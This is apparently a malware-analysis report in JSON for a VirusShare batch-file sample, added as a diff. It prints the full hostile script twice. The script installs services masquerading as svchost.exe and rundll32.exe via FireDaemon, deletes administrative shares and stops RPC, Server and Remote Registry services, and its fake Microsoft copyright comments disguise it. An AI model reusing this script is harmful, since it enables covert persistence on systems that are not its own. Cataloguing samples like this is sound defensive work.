@@ -1,0 +1,73 @@
+{
+    "docinfo": {
+        "attributes": [],
+        "behavior": {
+            "CALL": "May call a DLL using Excel 4 Macros",
+            "mkdir": "May create a directory"
+        },
+        "macro": "@echo off\nmkdir c:\\winnt\\system32\\dcache\\data\nmkdir c:\\winnt\\system32\\dcache\\data\\upload\nSET MXHOME=c:\\winnt\\system32\\dcache\\data\nSET MXBIN=c:\\winnt\\system32\\dcache\\data\nc:\\winnt\\system32\\dcache\\data\\FireDaemon -i svchost.exe \"c:\\winnt\\system32\\dcache\\data\" \"c:\\winnt\\system32\\dcache\\data\\svchost.exe\" \"XC.ini\" Y 0 0 Y Y\nc:\\winnt\\system32\\dcache\\data\\FireDaemon -i rundll32.exe \"c:\\winnt\\system32\\dcache\\data\" \"c:\\winnt\\system32\\dcache\\data\\rundll32.exe\" \"\" Y 0 0 Y Y\nc:\\winnt\\system32\\dcache\\data\\firedaemon -i AVhelper \"c:\\winnt\\system32\\dcache\\data\" \"c:\\winnt\\system32\\dcache\\data\\stop.bat\" \"/u\" Y 0 0 N Y\nnet start rundll32.exe\nnet start Avhelper\nnet start svchost.exe\nnet share /delete C$ /y >> net.deld\nnet share /delete E$ /y >> net.deld\nnet share /delete F$ /y >> net.deld\nnet share /delete G$ /y >> net.deld\nnet share /delete H$ /y >> net.deld\nnet share /delete I$ /y >> net.deld\nnet share /delete J$ /y >> net.deld\nnet share /delete Z$ /y >> net.deld\nnet share /delete F$ /y >> net.deld\nnet share /delete D$ /y >> net.deld\nnet share /delete ADMIN$ >> net.deld\nnet share /delete IPC$ >> net.deld\nnet stop \"Remote Registry Service\" \n:: Copyright Microsoft Corporation\nnet stop \"Computer Browser\" \n:: Copyright Microsoft Corporation\nnet stop \"server\"\n:: Copyright Microsoft Corporation\nnet stop \"REMOTE PROCEDURE CALL\" \n:: hi asl?\n:: hi asl?\n:: Copyright Microsoft Corporation\nnet stop \"REMOTE PROCEDURE CALL SERVICE\" \n:: Copyright Microsoft Corporation\nrunme.bat"
+    },
+    "filename": "VirusShare_05b37f1295923e2fa4841db11155eab3",
+    "filesize": 1505,
+    "filetype": "DOS batch file, ASCII text, with CRLF line terminators",
+    "hashes": {
+        "md5": "05b37f1295923e2fa4841db11155eab3",
+        "sha1": "1db87655335717411e1ad32f57f22a6c40f6ff62",
+        "sha256": "b71edc0cafb693bd1d04e7556bf5d4f17e1fa3410c7004d51becd909e19775d5"
+    },
+    "peinfo": {},
+    "strings": {
+        "dump": [
+            "@echo off",
+            "mkdir c:\\winnt\\system32\\dcache\\data",
+            "mkdir c:\\winnt\\system32\\dcache\\data\\upload",
+            "SET MXHOME=c:\\winnt\\system32\\dcache\\data",
+            "SET MXBIN=c:\\winnt\\system32\\dcache\\data",
+            "c:\\winnt\\system32\\dcache\\data\\FireDaemon -i svchost.exe \"c:\\winnt\\system32\\dcache\\data\" \"c:\\winnt\\system32\\dcache\\data\\svchost.exe\" \"XC.ini\" Y 0 0 Y Y",
+            "c:\\winnt\\system32\\dcache\\data\\FireDaemon -i rundll32.exe \"c:\\winnt\\system32\\dcache\\data\" \"c:\\winnt\\system32\\dcache\\data\\rundll32.exe\" \"\" Y 0 0 Y Y",
+            "c:\\winnt\\system32\\dcache\\data\\firedaemon -i AVhelper \"c:\\winnt\\system32\\dcache\\data\" \"c:\\winnt\\system32\\dcache\\data\\stop.bat\" \"/u\" Y 0 0 N Y",
+            "net start rundll32.exe",
+            "net start Avhelper",
+            "net start svchost.exe",
+            "net share /delete C$ /y >> net.deld",
+            "net share /delete E$ /y >> net.deld",
+            "net share /delete F$ /y >> net.deld",
+            "net share /delete G$ /y >> net.deld",
+            "net share /delete H$ /y >> net.deld",
+            "net share /delete I$ /y >> net.deld",
+            "net share /delete J$ /y >> net.deld",
+            "net share /delete Z$ /y >> net.deld",
+            "net share /delete F$ /y >> net.deld",
+            "net share /delete D$ /y >> net.deld",
+            "net share /delete ADMIN$ >> net.deld",
+            "net share /delete IPC$ >> net.deld",
+            "net stop \"Remote Registry Service\" ",
+            ":: Copyright Microsoft Corporation",
+            "net stop \"Computer Browser\" ",
+            ":: Copyright Microsoft Corporation",
+            "net stop \"server\"",
+            ":: Copyright Microsoft Corporation",
+            "net stop \"REMOTE PROCEDURE CALL\" ",
+            ":: hi asl?",
+            ":: hi asl?",
+            ":: Copyright Microsoft Corporation",
+            "net stop \"REMOTE PROCEDURE CALL SERVICE\" ",
+            ":: Copyright Microsoft Corporation",
+            "runme.bat"
+        ],
+        "file": {
+            "net start rundll32.exe": "Executable",
+            "net start svchost.exe": "Executable"
+        },
+        "fuzzing": {},
+        "ip": [],
+        "url": []
+    },
+    "time": "0:00:00.275649",
+    "version": "6.0.3",
+    "virustotal": {
+        "positives": "",
+        "total": ""
+    },
+    "yara_plugins": []
+}
